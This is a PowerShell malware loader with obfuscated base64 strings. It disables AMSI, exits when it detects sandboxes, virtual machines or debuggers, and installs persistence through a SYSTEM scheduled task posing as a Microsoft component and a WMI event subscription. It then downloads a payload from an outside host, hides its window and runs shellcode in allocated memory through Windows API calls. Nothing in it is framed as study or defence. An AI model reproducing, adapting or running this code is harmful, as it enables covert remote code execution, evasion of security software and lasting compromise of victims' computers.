function Get-Data { param([string]$d) try { return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d)) } catch { return "" } }

$cfg = @{
    "a" = "U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="; "b" = "YW1zaUluaXRGYWlsZWQ="; "c" = "Tm9uUHVibGljLFN0YXRpYw==";
    "d" = "a2VybmVsMzIuZGxs"; "e" = "SXNEZWJ1Z2dlclByZXNlbnQ=";
    "f" = @("dm10b29sc2Q=", "VkJveFNlcnZpY2U=", "d2lyZXNoYXJr", "b2xseWRiZw==", "eDY0ZGJn", "aWRhcQ==", "aWRhcTY0", "cHJvY21vbg==", "cHJvY2V4cA==");
    "g" = "SEtDVToNClNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bg=="; "h" = "TWljcm9zb2Z0RWRnZVVwZGF0ZQ==";
    "i" = "dXNlcjMyLmRsbA=="; "j" = "U2hvd1dpbmRvdw=="; "k" = "VmlydHVhbEFsbG9j"; "l" = "bnRkbGwuZGxs"; "m" = "TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ==";
    "n" = "Q2FsbFdpbmRvd1Byb2NB"; "o" = "aHR0cDovL2tlcmlzZWwuZnIvanMvT3ZlbmFuZnJ0Lm1peA==";
    "p" = "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgRmlyZWZveC8xNC4w"; "q" = "ZHlyZWtsYXNzZXI=";
    "r" = "WW91clN1cGVyU2VjcmV0MzJCeXRlQ3J5cHRvS2V5ISE="; "s" = "WW91clNlY3JldDE2Ql9JVg==";
    "u" = "R2V0TW9kdWxlSGFuZGxl"; "v" = "R2V0UHJvY0FkZHJlc3M=";
    "t2" = "TWljcm9zb2Z0IENvbXBhdGliaWxpdHkgQXBwcmFpc2Vy"; # Microsoft Compatibility Appraiser
    "w1" = "U3lzdGVtSGVhbHRoQ2hlY2tGaWx0ZXI="; # SystemHealthCheckFilter
    "w2" = "U3lzdGVtSGVhbHRoQ2hlY2tDb25zdW1lcg=="; # SystemHealthCheckConsumer
    "w3" = "X19FdmVudEZpbHRlcg=="; # __EventFilter
    "w4" = "Q29tbWFuZExpbmVFdmVudENvbnN1bWVy"; # CommandLineEventConsumer
    "w5" = "X19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZw=="; # __FilterToConsumerBinding
    "w6" = "cm9vdFxzdWJzY3JpcHRpb24="; # root\subscription
}

[Ref].Assembly.GetType((Get-Data $cfg.a)).GetField((Get-Data $cfg.b),(Get-Data $cfg.c)).SetValue($null,$true)

try {
    $c1 = Get-CimInstance Win32_ComputerSystem; if (($c1.TotalPhysicalMemory / 1GB) -lt 4 -or $c1.NumberOfLogicalProcessors -lt 2) { exit }
    $c2 = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime; if (((Get-Date) - $c2).TotalHours -lt 1) { exit }
    $c3 = $cfg.f | ForEach-Object { Get-Data $_ }; if (Get-Process | Where-Object { $c3 -contains $_.ProcessName }) { exit }
    $c4_code = "using System;using System.Runtime.InteropServices;public class D{ [DllImport(""$(Get-Data $cfg.d)"", SetLastError=true, ExactSpelling=true)][return: MarshalAs(UnmanagedType.Bool)] public static extern bool IsDebuggerPresent();}"
    Add-Type -TypeDefinition $c4_code -ErrorAction SilentlyContinue; if ([D]::IsDebuggerPresent()) { exit }
} catch {}

# --- HYDRA PERSISTENCE ---
try{
    $h1=$MyInvocation.MyCommand.Path;if($h1){
        $h2=(Get-Data $cfg.t2);if(-not(Get-ScheduledTask -TaskName $h2 -EA 0)){$h3=New-ScheduledTaskAction -Ex "powershell.exe" -Arg "-NoP -Win Hidden -EP Bypass -F `"$h1`"";$h4=New-ScheduledTaskTrigger -AtLogOn;$h5=New-ScheduledTaskPrincipal -UID "SYSTEM" -RL Highest;$h6=New-ScheduledTaskSettingsSet -ASIOB -DSIGOB -SWA;Register-ScheduledTask -TaskName $h2 -Action $h3 -Trigger $h4 -Principal $h5 -Settings $h6 -Desc "Maintains Windows component compatibility." -Force};
        $w1=(Get-Data $cfg.w6);$w2=(Get-Data $cfg.w1);$w3=(Get-Data $cfg.w2);if(-not(Get-WmiObject -NS $w1 -Class (Get-Data $cfg.w3) -Filter "Name='$w2'" -EA 0)){$w4="powershell.exe -NoP -Win Hidden -EP Bypass -F `"$h1`"";$w5="SELECT * FROM __IntervalTimerInstruction WHERE TimerId='HealthCheck'";$w6=@{Name=$w2;EventNamespace='root\cimv2';QueryLanguage='WQL';Query=$w5};$w7=Set-WmiInstance -NS $w1 -Class (Get-Data $cfg.w3) -Arg $w6;$w8=@{Name=$w3;CommandLineTemplate=$w4;RunInteractively=$false};$w9=Set-WmiInstance -NS $w1 -Class (Get-Data $cfg.w4) -Arg $w8;Set-WmiInstance -NS $w1 -Class (Get-Data $cfg.w5) -Arg @{Filter=$w7;Consumer=$w9}|Out-Null}
    }
}catch{}
# --- END OF HYDRA PERSISTENCE ---

$w_code = "using System;using System.Runtime.InteropServices;public class W { [DllImport(""$(Get-Data $cfg.d)"")] public static extern IntPtr $(Get-Data $cfg.u)(string A); [DllImport(""$(Get-Data $cfg.d)"", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)] public static extern IntPtr $(Get-Data $cfg.v)(IntPtr A, string B);}"
Add-Type -TypeDefinition $w_code -ErrorAction SilentlyContinue

function Expand-Stream { param($d, $k, $iv) try { $sp = New-Object System.Security.Cryptography.AesCryptoServiceProvider; $sp.Mode = [System.Security.Cryptography.CipherMode]::CBC; $sp.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; $sp.Key = $k; $sp.IV = $iv; $dec = $sp.CreateDecryptor(); return $dec.TransformFinalBlock($d, 0, $d.Length) } catch { return $null } }
function Resolve-API { param ($lib, $fn) $h_mod = [W]::GetModuleHandle($lib); return [W]::GetProcAddress($h_mod, $fn) }
function New-Delegate { param ($pt, [Type]$rt = [Void]) $an = New-Object System.Reflection.AssemblyName("RD"); $ab = [AppDomain]::CurrentDomain.DefineDynamicAssembly($an, "Run"); $mb = $ab.DefineDynamicModule("IM", $false); $tb = $mb.DefineType("DT", "Class, Public, Sealed, AnsiClass, AutoClass", [System.MulticastDelegate]); $m = $tb.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $rt, $pt); $m.SetImplementationFlags("Runtime, Managed"); return $tb.CreateType() }

[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
$wc = New-Object System.Net.WebClient; $wc.Headers['User-Agent'] = (Get-Data $cfg.p); $url = (Get-Data $cfg.o)
try { $dl = $wc.DownloadData($url); $b64d = [System.Text.Encoding]::UTF8.GetString($dl); $buf = [System.Convert]::FromBase64String($b64d) } catch { exit }

# $k = [System.Text.Encoding]::UTF8.GetBytes((Get-Data $cfg.r)); $iv = [System.Text.Encoding]::UTF8.GetBytes((Get-Data $cfg.s))
# $exec_buf = Expand-Stream -d $buf -k $k -iv $iv; if (-not $exec_buf) { exit }
$exec_buf = $buf

$z = 0; $title = (Get-Data $cfg.q); $Host.UI.RawUI.WindowTitle = $title; $hnd = (Get-Process | Where-Object { $_.MainWindowTitle -eq $title }).MainWindowHandle

$d1 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Resolve-API (Get-Data $cfg.i) (Get-Data $cfg.j)), (New-Delegate @([IntPtr], [UInt32]) ([IntPtr])))
$d1.Invoke($hnd, $z)

$d2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Resolve-API (Get-Data $cfg.d) (Get-Data $cfg.k)), (New-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$d3 = Resolve-API (Get-Data $cfg.l) (Get-Data $cfg.m)

$s1 = 12288; $s2 = 4; $s3 = 4
$m1 = $d2.Invoke($z, 6974, $s1, $s3)
$m2 = $d2.Invoke($z, 45805568, $s1, $s3)

[System.Runtime.InteropServices.Marshal]::Copy($exec_buf, $z, $m1, 6974)
[System.Runtime.InteropServices.Marshal]::Copy($exec_buf, 6974, $m2, (393989 - 6974))

$d4 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Resolve-API (Get-Data $cfg.i) (Get-Data $cfg.n)), (New-Delegate @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr])))
$d4.Invoke($m1, $m2, $d3, $z, $z)